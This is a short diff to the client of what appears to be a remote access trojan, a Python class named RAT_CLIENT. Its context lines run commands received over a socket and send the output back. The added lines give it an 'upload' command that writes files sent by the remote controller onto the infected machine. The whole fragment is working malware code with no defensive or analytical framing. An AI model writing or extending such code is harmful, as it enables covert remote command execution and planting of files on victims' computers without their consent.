@@ -34,7 +34,12 @@ class RAT_CLIENT:
                             continue
                         output = subprocess.getoutput(command)
                         s.send(output.encode())
-
+            elif command == 'upload':
+                filename = s.recv(6000)
+                newfile = open(filename, 'wb')
+                data = s.recv(6000)
+                newfile.write(data)
+                newfile.close()
 
 
 
